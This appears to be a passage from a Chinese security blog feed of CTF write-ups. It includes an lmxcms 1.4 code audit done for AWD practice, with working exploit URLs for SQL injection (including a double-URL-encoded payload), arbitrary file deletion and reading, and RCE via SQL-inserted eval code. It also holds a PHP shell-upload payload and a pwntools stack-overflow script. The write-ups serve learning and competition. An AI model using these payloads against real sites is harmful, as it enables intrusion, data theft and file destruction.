src="/../images/image-20251015102757340-1760512687700-82.png" alt="image-20251015102757340"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:7744/?shell=?&gt;&lt;?= `. /???/????????[@-[]`?&gt;</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">-----------110</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;</span><br><span class="line"></span><br><span class="line">#!/bin/sh</span><br><span class="line">env</span><br><span class="line">-----------110--</span><br></pre></td></tr></table></figure><h3 id="26-番外篇（4）Moe笑传之猜猜爆"><a href="#26-番外篇（4）Moe笑传之猜猜爆" class="headerlink" title="26 番外篇（4）Moe笑传之猜猜爆"></a>26 番外篇（4）<strong>Moe笑传之猜猜爆</strong></h3><p>生成的随机数字存储在randomnumber，直接修改或者访问都可以</p><p><img src="/../images/image-20251015143332428-1760512687700-86.png" alt="image-20251015143332428"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">randomNumber = 50;</span><br></pre></td></tr></table></figure><h3 id="【未完成】27-番外篇（5）附加挑战"><a href="#【未完成】27-番外篇（5）附加挑战" class="headerlink" title="【未完成】27 番外篇（5）附加挑战"></a>【未完成】27 番外篇（5）<strong>附加挑战</strong></h3><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">虽然说是新生赛，反序列化啊这种知识点还是不够全面，准备开一个《重生之我要当web糕手》系列，将缺少的知识点给补上</span><br><span class="line">java那一块也得，开始学开始补了，【这两题等补了java反序列化再回头看看吧】</span><br><span class="line">自己还是太菜，希望省赛真的补药爆零哇，到时候大彩笔的我不敢跟大师傅们面基了都。写的不好，欢迎和师傅们交流学习</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 一个男人一句话改变我的一生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个男人一句话改变我的一生之phpcms代码审计</title>
      <link href="/posts/12382.html"/>
      <url>/posts/12382.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">写在前面：在各位大师傅的投喂下，涨了很多见识所以开始了一个男人一句话改变我的一生系列。</span><br><span class="line">这一期是跟su战队的_sun_·empty.师傅和timeline战队的扬丘师傅的一次awd训练赛，在_sun_·empty.说要复盘才有意义的建议下。</span><br><span class="line">写了这篇上年纪的cms代码审计，如文章有任何问题可以联系我进行交流，感谢观看</span><br></pre></td></tr></table></figure><h1 id="lmxcms1-4，代码审计–复现"><a href="#lmxcms1-4，代码审计–复现" class="headerlink" title="lmxcms1.4，代码审计–复现"></a>lmxcms1.4，代码审计–复现</h1><p>在awd训练赛中遇到了这套cms，于是打算学习审计一手</p><p>每种漏洞只找了一个代表学习不代表只要一个，实际的漏洞点有很多</p><p>参考了师傅们的博客,先在这里贴一手</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_45764684/article/details/130962179</span><br><span class="line">https://blog.csdn.net/qq_38154820/article/details/129836774</span><br><span class="line">https://xz.aliyun.com/news/14971</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">常规搭建cms：phpstudy+phpstorm,apache2.4.39+MySQL5.7.26,php5.3.29</span><br><span class="line"></span><br><span class="line">在小皮面板搭建之后，直接访问/install，根据流程设计数据库，后台账号密码就好了</span><br><span class="line"></span><br><span class="line">后台默认密码 admin/123456</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251010233911216.png" alt="image-20251010233911216"></p><h3 id="cms请求处理格式"><a href="#cms请求处理格式" class="headerlink" title="cms请求处理格式"></a>cms请求处理格式</h3><p>进来先看到前台入口文件</p><p>配置文件：&#x2F;inc&#x2F;config.inc.php</p><p>初始化文件：&#x2F;inc&#x2F;run.inc.php</p><p><img src="/../images/image-20251010225942615.png" alt="image-20251010225942615"></p><p><img src="/../images/image-20251010230623939.png" alt="image-20251010230623939"></p><p>全局【ctrl+shift+alt+n】搜run()</p><p><img src="/../images/image-20251010230743576.png" alt="image-20251010230743576"></p><p>分别传参是类名，方法名</p><p><a href="http://127.0.0.1/lmxcms1.4/admin.php?m=xx">?m&#x3D;xx</a>类名&amp;a&#x3D;xx方法</p><h3 id="后台SQL注入漏洞"><a href="#后台SQL注入漏洞" class="headerlink" title="后台SQL注入漏洞"></a>后台SQL注入漏洞</h3><p>漏洞点：参数可控，参与执行sql语句</p><p>在bookaction.class.php,可控参数名id,进入getReply函数<img src="/../images/image-20251010231637489.png" alt="image-20251010231637489"></p><p>getReply—&gt;selectModel—&gt;selectDB</p><p><img src="/../images/image-20251010232525224.png" alt="image-20251010232525224"></p><p><img src="/../images/image-20251010232529755.png" alt="image-20251010232529755"></p><p><img src="/../images/image-20251010232533337.png" alt="image-20251010232533337"></p><p>可以发现将id传进去，一层解一层在selectDB执行了sql语句</p><p>常规调试是不会看到sql语句，在执行之后添加echo $sql;来看具体的调试情况</p><p><img src="/../images/image-20251010232925033.png" alt="image-20251010232925033"></p><p>根据前面知道的请求格式，给id随便传个参数，注意方法名是一开始的reply()</p><p>【注意这个是admin下的后台漏洞】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin.php?m=book&amp;a=reply&amp;id=1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251010233433548.png" alt="image-20251010233433548"></p><p>有回显，报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin.php?m=Book&amp;a=reply&amp;id=1) and updatexml(0,concat(0x7e,user()),1)--+</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251010233633278.png" alt="image-20251010233633278"></p><h3 id="前台SQL注入漏洞"><a href="#前台SQL注入漏洞" class="headerlink" title="前台SQL注入漏洞"></a>前台SQL注入漏洞</h3><p>漏洞点：在过滤函数之前进行url解码【不严格】</p><p>找到name参数，由data来，追踪p有post和get传输</p><p><img src="/../images/image-20251011103134787.png"></p><p>有post和get传输，说明参数可控，回到处理name数据函数</p><p><img src="/../images/image-20251011103209563.png"></p><p>继续跟进getNameData</p><p><img src="/../images/image-20251011103412666.png"></p><p>–&gt;onemodel<img src="/../images/image-20251011103422783.png" alt="image-20251011103422783"></p><p>—&gt;oneDB,在oneDB中执行了sql语句，</p><p><img src="/../images/image-20251011103459787.png"></p><p>同时在p处理data的时候，发现了过滤非法提交信息函数filte_sql<img src="/../images/image-20251011103845173.png"></p><p>但是回到主函数可以看到有urldecode 并且是在执行sql语句之后</p><p><img src="/../images/image-20251011105045779.png" alt="image-20251011105045779"></p><p>二次编码注入：当对name传输数据时会先进行一次url解码，如果将payload二次编码，解了一次之后还有一层url编码，filte_sql就过滤不了恶意payload，产生漏洞了</p><p>【注意：客户端和服务端看代码的流程是要反过来的】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; and updatexml(1,concat(0x7e,(select version()),0x7e),1) #</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?m=tags&amp;name=%25%36%31%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%37%35%25%37%30%25%36%34%25%36%31%25%37%34%25%36%35%25%37%38%25%36%64%25%36%63%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%63%25%33%31%25%32%39%25%32%30%25%32%33</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251011105625012.png" alt="image-20251011105625012"></p><h3 id="后台任意文件删除"><a href="#后台任意文件删除" class="headerlink" title="后台任意文件删除"></a>后台任意文件删除</h3><p>漏洞点：unlink函数</p><p>全局搜索调用情况</p><p><img src="/../images/image-20251011111212814.png" alt="image-20251011111212814"></p><p>delone</p><p><img src="/../images/image-20251011111317078.png" alt="image-20251011111317078"></p><p>delbackdb调用了delone，发现filename是get可控参数</p><p><img src="/../images/image-20251011111339902.png" alt="image-20251011111339902"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin.php？m=Backdb&amp;a=delbackdb&amp;filename=../../install/1.txt</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251011111727606.png" alt="image-20251011111727606"></p><h3 id="后台任意文件读取"><a href="#后台任意文件读取" class="headerlink" title="后台任意文件读取"></a>后台任意文件读取</h3><p>漏洞点文件读取函数file_get_contents</p><p><img src="/../images/image-20251011113130400.png" alt="image-20251011113130400"></p><p>查看getcon调用情况</p><p><img src="/../images/image-20251011113321090.png" alt="image-20251011113321090"></p><p>dir参数可控，在当前editfile目录访问就能进行读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://lmxcms//admin.php?m=Template&amp;a=editfile&amp;dir=admin/AD//ad.html</span><br><span class="line"></span><br><span class="line">http://lmxcms//admin.php?m=Template&amp;a=editfile&amp;dir=../inc//db.inc.php</span><br></pre></td></tr></table></figure><p>注意最后查看是&#x2F;&#x2F;</p><p><img src="/../images/image-20251011114801112.png" alt="image-20251011114801112"></p><h3 id="后台文件上传漏洞"><a href="#后台文件上传漏洞" class="headerlink" title="后台文件上传漏洞"></a>后台文件上传漏洞</h3><p>漏洞点：file_put_contents函数</p><p>在任意读取当中也存在文件上传漏洞 </p><p><img src="/../images/image-20251011115339998.png" alt="image-20251011115339998"></p><p><img src="/../images/image-20251011115404627.png" alt="image-20251011115404627"></p><p>post分别传入文件名称跟内容就好了【没有测成功】</p><p><img src="/../images/image-20251011143322125.png" alt="image-20251011143322125"></p><p>黑盒的后台文件上传漏洞，可以自行修改文件上传类型</p><p><img src="/../images/image-20251011143422118.png" alt="image-20251011143422118"></p><p>上传构造好的php文件就好了</p><p><img src="/../images/image-20251011143530032.png" alt="image-20251011143530032"></p><h3 id="后台命令执行漏洞"><a href="#后台命令执行漏洞" class="headerlink" title="后台命令执行漏洞"></a>后台命令执行漏洞</h3><p>漏洞点：sql写马导致rec</p><p>找到eval函数 跟进参数get传参cid可控</p><p><img src="/../images/image-20251011144452040.png" alt="image-20251011144452040"></p><p>走进caijidataone函数，发现掉了cj_data_tab()</p><p><img src="/../images/image-20251011144548654.png" alt="image-20251011144548654"></p><p>查询的是cj_data表</p><p><img src="/../images/image-20251011144730710.png" alt="image-20251011144730710"></p><p><img src="/../images/image-20251011144741088.png" alt="image-20251011144741088"></p><p><img src="/../images/image-20251011144744835.png" alt="image-20251011144744835"></p><p>那么只要在cj_data表中插入，恶意代码，在执行sql查询执行了恶意代码实现命令执行,后台找到可以执行sql语句的地方</p><p><img src="/../images/image-20251011150025893.png" alt="image-20251011150025893"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `lmxcms`.`lmx_cj_data` (`id`, `lid`, `data`, `uid`, `url`, `time`) VALUES (3, 4, &#x27;phpinfo()&#x27;, 33, &#x27;a&#x27;, 5);</span><br><span class="line"></span><br><span class="line">/admin.php?m=Acquisi&amp;a=showCjData&amp;id=1&amp;lid=4&amp;cid=3</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251011150355759.png" alt="image-20251011150355759"></p><p><img src="/../images/image-20251011145940775.png" alt="image-20251011145940775"></p><h3 id="awd思路"><a href="#awd思路" class="headerlink" title="awd思路"></a>awd思路</h3><p>因为是从awd中遇到的cms，如何获得flag，提交拿到分数才是重点</p><p>能获得本地根目录下的flag基本上是后台漏洞为主</p><h4 id="登陆对抗"><a href="#登陆对抗" class="headerlink" title="登陆对抗"></a>登陆对抗</h4><h5 id="维护"><a href="#维护" class="headerlink" title="维护"></a>维护</h5><p>连接相应的数据库替换 admin的默认密码pwd字段【是否加salt】</p><p><img src="/../images/image-20251011151829593.png" alt="image-20251011151829593"></p><h5 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h5><p>如果cms的默认密码被改了的情况下，可以使用前台sql注入漏洞获得相应admin的pwd字段【但不一定能够解密出来】</p><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>在awd当中要攻击的主机不止一台，在没有权限控制的情况下，是否可以写一个批量登陆脚本获得cookie【没来得及验证】，为后面打exp要验证管理员身份做铺垫</p><h4 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h4><p>在awd过程当中这一套cms的漏洞打得多的是删除和上传。</p><p>在读取没有被修的情况下，效率最高，只要登陆后台，打exp就好了</p><p>打的时候，发现家里啥都被删没了和多了一堆马子都是痛苦的</p><p>文件上传点依旧是经典的一句话木马转不死马，被打进来的时候，还找不到竞争脚本，下次应该开局先放上去的</p><p>这一次的点全在后台，打exp要权限验证，没整过这个点，以至于后面摆烂拖后腿了</p><p>维护的话，还是感觉修改默认密码，加ctf_waf，每个点改的话来不及，但是这次都没加【下源码下了20分钟】不嘻嘻</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这次坑了sun和杨丘师傅，感谢不杀之恩，我下一次肯定会做到的【坚信】</p><p>phpcms的代码审计，寻找可控参数变量，有没有参与危险函数，白盒+黑盒一起试，搭建的时候注意配置，awd的时候，要快速的打exp和历史漏洞获得分数，注意常规的维护。pwn是堆溢出【等我再沉淀沉淀】</p>]]></content>
      
      
      <categories>
          
          <category> 一个男人一句话改变我的一生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一届NetDreamCTF赛后复现</title>
      <link href="/posts/38132.html"/>
      <url>/posts/38132.html</url>
      
        <content type="html"><![CDATA[<h2 id="第一届NetDreamCTF赛后复现（部分题目）"><a href="#第一届NetDreamCTF赛后复现（部分题目）" class="headerlink" title="第一届NetDreamCTF赛后复现（部分题目）"></a>第一届NetDreamCTF赛后复现（部分题目）</h2><p>全部的题解：<a href="https://mp.weixin.qq.com/s/zl151-YJSiyj0TvjKmNggw">https://mp.weixin.qq.com/s/zl151-YJSiyj0TvjKmNggw</a></p><p>存档：<a href="https://github.com/Team-intN18-SoybeanSeclab/NetDreamCTF2025_Source">https://github.com/Team-intN18-SoybeanSeclab/NetDreamCTF2025_Source</a></p><p>纸豪学长的讲解：<a href="https://www.bilibili.com/video/BV14aYBzDEGA/?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=3cad66818fbd72b6100b5f159983493b">netdream2025题目讲解 ezpwn&amp;ezupload&amp;ezbypass_哔哩哔哩_bilibili</a></p><p><img src="/../images/image-20250817140400019.png" alt="image-20250817140400019"></p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目：你知道Base和TXT吗?Y3RmLmN0Zi52aW4=</span><br></pre></td></tr></table></figure><p>base64解码之后 txt域名解析记录</p><p><img src="/../images/image-20250817140706604.png" alt="image-20250817140706604"></p><p><img src="/../images/image-20250817140803070.png" alt="image-20250817140803070"></p><h4 id="I-AM-K"><a href="#I-AM-K" class="headerlink" title="I AM K!"></a>I AM K!</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">题目：</span><br><span class="line">B3F0re赵的立方体-1398441600</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def encrypt(plaintext, key):</span><br><span class="line">    key_sum = sum(ord(char) for char in key)</span><br><span class="line">    if not plaintext.startswith(&quot;flag&#123;&quot;):</span><br><span class="line">        plaintext = &quot;flag&#123;&quot; + plaintext</span><br><span class="line">    if not plaintext.endswith(&quot;&#125;&quot;):</span><br><span class="line">        plaintext += &quot;&#125;&quot;</span><br><span class="line">    </span><br><span class="line">    encrypted = []</span><br><span class="line">    for char in plaintext:</span><br><span class="line">        encrypted_char = (ord(char) + key_sum) % 256 </span><br><span class="line">        encrypted.append(encrypted_char)</span><br><span class="line"></span><br><span class="line">    encrypted_bytes = bytes(encrypted)</span><br><span class="line">    base64_encoded = base64.b64encode(encrypted_bytes).decode(&#x27;utf-8&#x27;)</span><br><span class="line">    shift = key_sum % 26</span><br><span class="line">    caesar_shifted = &quot;&quot;</span><br><span class="line">    for char in base64_encoded:</span><br><span class="line">        if char.isalpha():</span><br><span class="line">            shifted_char = chr(((ord(char) - ord(&#x27;A&#x27;) + shift) % 26 + ord(&#x27;A&#x27;))) if char.isupper() else chr(((ord(char) - ord(&#x27;a&#x27;)) + shift) % 26 + ord(&#x27;a&#x27;))</span><br><span class="line">            caesar_shifted += shifted_char</span><br><span class="line">        else:</span><br><span class="line">            caesar_shifted += char</span><br><span class="line">    hex_encoded = caesar_shifted.encode(&#x27;utf-8&#x27;).hex()</span><br><span class="line">    </span><br><span class="line">    return hex_encoded</span><br><span class="line"></span><br><span class="line">key = &quot;xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx_xx&quot;</span><br><span class="line"></span><br><span class="line">plaintext = &quot;Thi5 1s th3 Fl@g&quot; </span><br><span class="line"></span><br><span class="line">ciphertext = encrypt(plaintext, key)</span><br><span class="line">print(ciphertext)</span><br><span class="line"></span><br><span class="line">#686545356839417466377a5266364133695a54556a376857696f6c4e67377a5166364248</span><br></pre></td></tr></table></figure><p>1.(ASCII值 + key_sum) % 256</p><p>2.字节列表转换为字节串，再进行 Base64 编码</p><p>3.凯撒移位</p><p>4.十六进制编码</p><p>这里是自己爆破密钥了 预期确实精妙【musc】</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_with_keysum</span>(<span class="params">ciphertext_hex, key_sum</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Hex decode</span></span><br><span class="line">        ciphertext_bytes = <span class="built_in">bytes</span>.fromhex(ciphertext_hex)</span><br><span class="line">        caesar_shifted = ciphertext_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Reverse Caesar shift</span></span><br><span class="line">        shift = key_sum % <span class="number">26</span></span><br><span class="line">        base64_encoded = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> caesar_shifted:</span><br><span class="line">            <span class="keyword">if</span> char.isalpha():</span><br><span class="line">                <span class="keyword">if</span> char.isupper():</span><br><span class="line">                    shifted_char = <span class="built_in">chr</span>(((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - shift) % <span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    shifted_char = <span class="built_in">chr</span>(((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) - shift) % <span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">                base64_encoded += shifted_char</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                base64_encoded += char</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Base64 decode</span></span><br><span class="line">        encrypted_bytes = base64.b64decode(base64_encoded)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Reverse additive cipher</span></span><br><span class="line">        plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> byte <span class="keyword">in</span> encrypted_bytes:</span><br><span class="line">            decrypted_char = (byte - key_sum) % <span class="number">256</span></span><br><span class="line">            plaintext += <span class="built_in">chr</span>(decrypted_char)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Check for &#x27;flag&#123;...&#125;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> plaintext.startswith(<span class="string">&quot;flag&#123;&quot;</span>) <span class="keyword">and</span> plaintext.endswith(<span class="string">&quot;&#125;&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> plaintext</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">ciphertext_hex = <span class="string">&quot;686545356839417466377a5266364133695a54556a376857696f6c4e67377a5166364248&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Brute-force key_sum from 0 to 10000</span></span><br><span class="line"><span class="keyword">for</span> key_sum <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10001</span>):</span><br><span class="line">    plaintext = decrypt_with_keysum(ciphertext_hex, key_sum)</span><br><span class="line">    <span class="keyword">if</span> plaintext:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found key_sum = <span class="subst">&#123;key_sum&#125;</span>, plaintext = <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h4 id="ezimg"><a href="#ezimg" class="headerlink" title="ezimg"></a>ezimg</h4><p>这里做的时候被做局了 没看到py文件藏的 还是太单纯了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目：给了张奶龙图片</span><br></pre></td></tr></table></figure><p>![milkdragon (1)](..&#x2F;images&#x2F;milkdragon (1).jpg)</p><p>使用winhex打开图片，在最后有两段的base64密文</p><p><img src="/../images/image-20250817142438533.png" alt="image-20250817142438533"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.bilibili.com/video/BV1GJ411x7h7/</span><br><span class="line">https://docs.qq.com/doc/DZWxobHhmRW9pd09k</span><br></pre></td></tr></table></figure><p>第一个是纯骚扰</p><p>打开第二个，全部复制出来有</p><p><img src="/../images/image-20250817142615568.png" alt="image-20250817142615568"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">并非flag</span><br><span class="line">flag&#123;114514-1919810-B1ngF3i_1s_a_@mazing_0ld3r&#125;</span><br><span class="line">aHR0cHM6Ly93d2duLmxhbnpvdWwuY29tL2kzcTR5MzBodWVmYQ==</span><br></pre></td></tr></table></figure><p> 再解密有一个下载链接里面有个压缩包里面是个py文件</p><p> <img src="/../images/image-20250817142948773.png" alt="image-20250817142948773"></p><p> 没看到下面还有东西 没做出来</p><p><img src="/../images/image-20250817143016863.png" alt="image-20250817143016863"></p><p> 将上面获得的flag放进去解密就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = base64.urlsafe_b64encode(<span class="string">b&#x27;flag&#123;114514-1919810-B1ngF3i_1s_a_@mazing_0ld3r&#125;&#x27;</span>[:<span class="number">32</span>].ljust(<span class="number">32</span>, <span class="string">b&#x27;\0&#x27;</span>)[:<span class="number">32</span>])</span><br><span class="line">cipher = Fernet(key)</span><br><span class="line">c=</span><br><span class="line"><span class="string">&quot;gAAAAABoa6KH5msX3aA5PUiSZq1Ubma9DvtpU9ywyijLEbfQYNl-hn5Q_4NlmpcAD2pNjq07KvMYd2R32Id_R_3iW5GZn3yKTBW5R_5jFI_307_S9oep0zE0dhZCf_XOymC2WQhB2_6s&quot;</span></span><br><span class="line">decrypted = cipher.decrypt(c.encode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted plaintext:&quot;</span>, decrypted.decode())</span><br></pre></td></tr></table></figure><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="ezpwn"><a href="#ezpwn" class="headerlink" title="ezpwn"></a>ezpwn</h4><p>- </p><p>这里贴一下[纸豪]<a href="https://www.bilibili.com/video/BV14aYBzDEGA/?spm_id_from=333.1387.homepage.video_card.click&vd_source=3cad66818fbd72b6100b5f159983493b">netdream2025题目讲解 ezpwn&amp;ezupload&amp;ezbypass_哔哩哔哩_bilibili</a>学长~ 的链接 声音很帅</p><p> <img src="/../images/image-20250817153655298.png" alt="image-20250817153655298"></p><p> 题目进来跟进到vuln</p><p><img src="/../images/image-20250817153729143.png" alt="image-20250817153729143"></p><p> <img src="/../images/image-20250817154009298.png" alt="image-20250817154009298"></p><p> 明显的栈溢出 找后门地址和偏移量</p><p><img src="/../images/image-20250817154040309.png" alt="image-20250817154040309"></p><p> <img src="/../images/image-20250817154054280.png" alt="image-20250817154054280"></p><p>使用cyclic工具测算</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cyclic 100</span><br><span class="line">gdb ./pwn</span><br><span class="line">输入生成的字符串 看到停在了0x61616174</span><br><span class="line">cyclic -l 0x61616174 得到偏移量76</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250817155853433.png" alt="image-20250817155853433"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./attachment&#x27;)</span><br><span class="line">#p = remote(&quot;127.0.0.1&quot;, 9999)</span><br><span class="line">payload = b&#x27;a&#x27; * 76 + p32(0x080491B6)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250817164600305.png" alt="image-20250817164600305"></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>web都是docker拉下来的 flag是自己填上去的 都一样的 </p><h4 id="ezpython"><a href="#ezpython" class="headerlink" 